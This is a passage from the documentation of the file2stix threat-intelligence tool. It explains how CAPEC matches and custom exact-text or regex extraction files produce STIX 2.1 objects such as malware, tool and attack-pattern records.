For example, if the uploaded text contained CAPEC-170 it would match to the CAPEC Object [CAPEC-170 Web Application Fingerprinting](https://github.com/mitre/cti/blob/master/capec/2.1/attack-pattern/attack-pattern--0cf857f6-afa4-4f0c-850f-58a4f11df157.json) and an SRO would be created between the Report SDO and this Attack Pattern SDO.

### 23. Custom Extractions

You can also write your own custom extractions using either exact text matches or regular expressions.

Custom extractions can be written and stored in a plain text file that can be passed when running the script as `--custom-extraction-file`.

Inside the custom extraction file you must specify an

1. extraction string or regex
2. extraction type (either `regex` or `exact`)
3. the STIX 2.1 Object or MITRE / CAPEC Object to use when a match is detected

file2stix used `re` for regex matching.

You can pass multiple custom extractions on each line of the file like so;

```csv
"EXTRACTION STRING",STIX-OBJECT-TYPE,exact
"EXTRACTION REGEX",STIX-OBJECT-TYPE,regex
```

The following STIX 2.1 Objects are supported by custom extractions:

* [Attack Pattern](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070618) (`attack-pattern`)
* [Campaign](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070621) (`campaign`)
* [Course of Action](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070624) (`course-of-action`)
* [Infrastructure](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070636) (`infrastructure`)
* [Intrusion Set](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070639) (`intrustion-set`)
* [Malware](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070645) (`malware`)
* [Threat Actor](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070663) (`threat-actor`)
* [Tool](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070666) (`tool`)

e.g. to search a document for the string "RYUK" and create a Malware STIX 2.1 SDO if a match is identified;

```csv
"ryuk",malware,exact
```

You can also create multiple custom extractions in the same file by adding multiple lines, e.g.

```csv
"ryuk",malware,exact
"darkhotel",malware,exact
"patch",course-of-action,exact
```

You can see an example custom extraction file in `tests/file_inputs/custom_extractions/test_extractions.txt`